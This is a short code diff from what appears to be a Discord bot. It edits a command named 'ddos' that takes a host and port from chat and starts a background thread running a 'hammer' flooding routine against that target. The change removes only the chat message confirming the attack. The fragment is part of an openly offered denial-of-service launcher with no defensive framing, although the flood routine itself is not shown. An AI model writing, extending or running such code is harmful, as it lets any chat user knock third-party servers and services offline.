@@ -26,7 +26,6 @@ async def ddos(ctx,arg,port):
         return
     hammer.host = arg
     hammer.port = port
-    await ctx.send("Attacking " + arg + " successfully.")
     ddos = threading.Thread(target=hammer.start)
     ddos.setDaemon(True)
     ddos.start()
